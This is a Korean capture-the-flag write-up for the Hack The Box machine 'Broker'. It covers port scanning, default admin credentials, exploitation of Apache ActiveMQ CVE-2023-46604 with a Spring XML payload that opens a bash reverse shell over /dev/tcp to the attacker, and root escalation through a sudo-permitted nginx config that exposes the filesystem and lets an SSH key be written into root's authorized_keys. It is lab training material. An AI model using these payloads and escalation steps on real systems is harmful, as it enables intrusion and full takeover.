# HTB-BROKER
```bash
OS: linux
DATE: 26.08.27
DIFFICULTY: Easy
```

## RECON
**nmap**: 처음 IP를 받은 후 포트 검사를 실시했다.
```bash
nmap -sC -sV IP
nmap -p- -T4 IP
```
간단한 검사와 전체 포트 검사를 같이 진행하였다. 결과는 `22,80`이 나왔다. 이후 각 포트마다 상세 검사를 통해 http와 ssh 서비스가 실행 중인 것을 알 수 있었다.

## Initial Access
처음 http 서비스에 접근했다. 접근하자마자 alert 창으로 로그인 창이 떠서 admin/admin으로 시도해본 결과 로그인에 성공할 수 있었다.
```bash
ID: admin
PASS: admin
```
로그인 성공 후 Apache ActiveMQ 서비스가 실행되고 있다는 것을 알게 되었다. 웹을 뒤져본 결과 Apache ActiveMQ v5.15.15 버전이라는 것을 알게 되었다.

![apach](/HTB/attach_real/Pasted%20image%2020260827152104.png)

**exploit**
구글링 해본 결과 이 버전은 CVE-2023-46604 취약점이 있다는 것을 알 수 있었다. 이후 PoC를 검색한 결과 Python 코드와 xml 코드를 제공받았다. 원리를 요약하면:
```bash
1. poc.py  → ActiveMQ한테 "이 XML 실행해" 라고 말함
2. ActiveMQ → 내 서버에서 XML 가져옴
3. poc.xml  → 명령어 실행 (리버스쉘 연결)
```
깃허브에서 제공받은 xml은 리버스쉘 페이로드가 아니라 연결 확인용 코드라서, 내 IP 기준으로 리버스쉘로 수정하였다.
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans
   http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>bash -i &gt;&amp; /dev/tcp/tun0_IP/4444 0&gt;&amp;1</value>
            </list>
        </constructor-arg>
    </bean>
</beans>
```
[PoC 원본](https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2023-46604)

이후 대기하고 있던 netcat으로 첫 user 쉘을 얻을 수 있었다.

`nc -nlvp 4444`

![user](/HTB/attach_real/Pasted%20image%2020260827154014.png)

## Privilege Escalation
쉘을 획득하자마자 `sudo -l`을 실행해본 결과, NOPASSWORD 항목에 `/usr/sbin/nginx`가 있어 sudo로 실행할 수 있음을 확인했다.

![priv](/HTB/attach_real/Pasted%20image%2020260827163007.png)

GTFOBins라는 권한 상승 정보 사이트에서 nginx로 권한 상승이 가능한 것을 찾아보았고, 타겟 서버에서 nginx를 열어두면 내 컴퓨터에서 파일 정보를 얻을 수 있었다.

**타겟 쉘**
```bash
cat >/tmp/temp <<EOF
user root;
http {
  server {
    listen 1111;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
events {}
EOF

nginx -c /tmp/temp
```
**내 칼리 쉘**
```bash
curl TARGET_IP -o /root/root.txt
```
하지만 이렇게 하는 것은 루트 쉘을 얻은 것이 아니기 때문에, **ssh-keygen**을 사용하여 대상 쉘에 공개키를 업로드한 후 ssh 접속을 시도해보았다.

**ssh keygen 만들기**: ssh 개인키와 공개키 중 공개키를 대상 쉘에 업로드해보았다.
`ssh-keygen -t rsa -f /tmp/broker`

**타겟 쉘**
```bash
cat >/tmp/upload<<EOF
user root;
http {
  server {
    listen 1112;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
events {}
EOF

nginx -c /tmp/upload
```

**내 칼리 쉘**
```bash
curl -X POST http://TARGET_IP:1112/root/.ssh/authorized_keys -d "$(cat /tmp/broker.pub)"
```
이후 ssh로 root 쉘 접속을 시도하였다.
```bash
ssh -i /tmp/broker root@IP
```
이를 통해 root 쉘을 얻게 되었다.

![root](/HTB/attach_real/Pasted%20image%2020260827160047.png)

## New Inform
- ssh-keygen을 통해 내 칼리 쉘로 상대 쉘에 접속하는 방법을 알게 되었다. `path: /.ssh/authorized_keys`
- nginx가 어떤 서비스인지 자세히 알게 되었다.
- PoC 코드를 내 상황에 맞게 수정하고 활용해야 한다는 것을 알게 되었다.